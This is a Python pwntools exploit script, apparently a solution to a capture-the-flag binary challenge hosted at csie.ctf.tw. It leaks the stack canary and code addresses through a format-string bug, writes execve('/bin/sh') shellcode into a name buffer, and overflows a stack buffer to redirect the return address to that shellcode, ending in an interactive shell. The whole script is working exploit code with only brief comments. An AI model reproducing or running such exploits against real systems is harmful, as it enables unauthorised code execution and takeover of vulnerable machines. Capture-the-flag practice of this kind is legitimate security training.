from sys import argv

from pwn import *

context.arch = 'amd64'

if len(argv) > 1 and argv[1] == 'remote':
    host = 'csie.ctf.tw'
    port = 10122
else:
    host = '127.0.0.1'
    port = 8888

r = remote(host, port)

def set_name(name, sendline=True):
    r.recvuntil('> ')
    r.sendline(b'1')
    r.recvuntil(':')
    if sendline:
        r.sendline(name)
    else:
        r.send(name)

def show_info():
    r.recvuntil('> ')
    r.sendline(b'2')

def save_data(data, sendline=True):
    r.recvuntil('> ')
    r.sendline(b'3')
    if sendline:
        r.sendline(data)
    else:
        r.send(data)

def exit():
    r.recvuntil('> ')
    r.sendline(b'4')

def leak_addr(stack_idx):
    set_name('%{}$p'.format(stack_idx).encode())
    show_info()
    r.recvuntil(':')
    addr = int(r.recvuntil('*')[:-1], 16)
    return addr

# leak stack addresses
# input('check stack address')
# for i in range(1, 50):
#     set_name('%{}$p'.format(i).encode())
#     show_info()
#     r.recvuntil(':')
#     addr = r.recvuntil('*')[:-1]
#     print('stack #{} ='.format(i), addr)

# leak addresses
some_stack = leak_addr(22)
bin_sh = some_stack - 0xf0
canary = leak_addr(23)
__libc_csu_init = leak_addr(24)
menu = __libc_csu_init - 0xd40 + 0xc3d
name = menu + 0x55d3b1095020 - 0x55d3b0e93c3d
print('/bin/sh     =', hex(bin_sh))
print('canary      =', hex(canary))
print('name        =', hex(name))

# sc to open shell
# len(sc) == 12
sc = """
    /* execve('/bin/sh', 0, 0) */
    xor rsi, rsi
    push (SYS_execve) /* 0x3b */
    pop rax
    mov rdi, rbp
    cdq /* rdx=0 */
    syscall
    """
print(len(asm(sc)))
set_name(asm(sc))

# overwrite return address to call shellcode in name
payload = b'a'*128
payload += b'/bin/sh\0'
payload += flat([canary, bin_sh, name])
save_data(payload)

# input('trace')
exit()

r.interactive()
